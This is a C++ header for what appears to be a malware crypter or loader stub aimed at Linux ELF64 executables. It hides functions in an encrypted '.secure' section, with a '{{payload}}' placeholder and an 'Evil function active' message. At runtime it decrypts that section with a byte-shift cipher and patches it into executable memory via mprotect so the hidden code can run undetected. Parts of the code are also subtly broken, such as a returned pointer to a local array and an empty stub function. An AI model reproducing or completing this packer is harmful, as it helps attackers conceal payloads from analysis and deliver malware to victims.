#include "stdafx.h"

#ifndef Loader_H
#define Loader_H

#define CRYPTED __attribute__((section(".secure")))

/**
 * @brief Encrypted, hidden section functions. 
 */
CRYPTED int stub() {/* Marker for top of section */}
// CRYPTED unsigned char key[] = "{{key}}"; // for replace("{{key}}", actualKey);
CRYPTED unsigned char* decodePayload() {

    unsigned char data[] = "{{payload}}"; // for replace("{{payload}}", actualPayload);

    printf("Evil function active...\n");

    return data;
}


/**
 * Functions that decodes the sections.
 */
class Stage2 {
private:
    FILE* target = NULL;
    Elf64_Ehdr elfHdr;
    Elf64_Shdr* allSections;

    // Decrypts an section.
    bool decryptSection(Elf64_Shdr secretSection) {

        // First locate the (encrypted) function bytes.
        fseek(target, secretSection.sh_offset, SEEK_SET);
        unsigned char functionBytes[secretSection.sh_size];
        fread(functionBytes, secretSection.sh_size, 1, target);

        // Decrypt the section bytes.
        unsigned char* decrypted = decryptBytes(functionBytes, secretSection.sh_size);


        // Now overwrite the function bytes inside memory page.
        long pageSize = sysconf(_SC_PAGE_SIZE);
        long pageAddr = (long)&stub-((long)&stub % pageSize);

        // Change the permissions to able to write.
        if (mprotect((void*)pageAddr, pageSize, PROT_READ | PROT_WRITE | PROT_EXEC) < 0) {
            printf("Failed to change permissions to write! Code: %d\n", errno);
            return false;
        }

        // Write the decrypted data to the correct location inside the page.
        memcpy((void*)&stub, decrypted, secretSection.sh_size);

        // Set permissions back.
        if (mprotect ((void*)pageAddr, pageSize, PROT_READ | PROT_EXEC) < 0) {
            printf("Failed to change permissions back! Code: %d\n", errno);
            return false;
        } 

        return true;
    }

    // Reads in the sections inside an array.
    Elf64_Shdr* readAllSections() {
        
        Elf64_Shdr* sections = new Elf64_Shdr[this->elfHdr.e_shnum];
        fseek(target, this->elfHdr.e_shoff, SEEK_SET);

        for (int i = 0; i < this->elfHdr.e_shnum; i++) {
            fread(&sections[i], this->elfHdr.e_shentsize, 1, target);
        }

        return sections;
    }

    // Reads in the section string table.
    char* sectionStringTable(Elf64_Shdr section) {
        char* table = new char[section.sh_size];
        fseek(target, section.sh_offset, SEEK_SET);
        fread(table, section.sh_size, 1, target);
        return table;
    }

    // Decrypts the given bytes.
    unsigned char* decryptBytes(unsigned char* bytes, long size) {
        unsigned char* decrypted = new unsigned char[size];
    
        for (int i = 0; i < size; i++) {
            decrypted[i] = bytes[i] -13;
        }

        return decrypted; 
    }

public:
    Stage2(char* progname) {
        target = fopen(progname, "rb");
        if (target == NULL) {
            printf("For some reason, cannot open executable! Code: %d\n\n", errno);
            return;
        }

        // Read in ELF64 header.
        fread(&elfHdr, sizeof(Elf64_Ehdr), 1, target);
    }

    bool decodeSections() {

        this->allSections = readAllSections();
        char* stringTable = sectionStringTable(this->allSections[elfHdr.e_shstrndx]);

        for (int i = 0; i < this->elfHdr.e_shnum; i++) {

            if (memcmp(stringTable + allSections[i].sh_name, ".secure\0", 8) == 0) {
                
                if (!decryptSection(allSections[i])) {
                    printf("Failed to unpack section!\n\n");
                    return false;
                }
            }
        }

        return true;
    }

    unsigned char* getKey() {
        return NULL;
    }
};


#endif //! ~Loader_H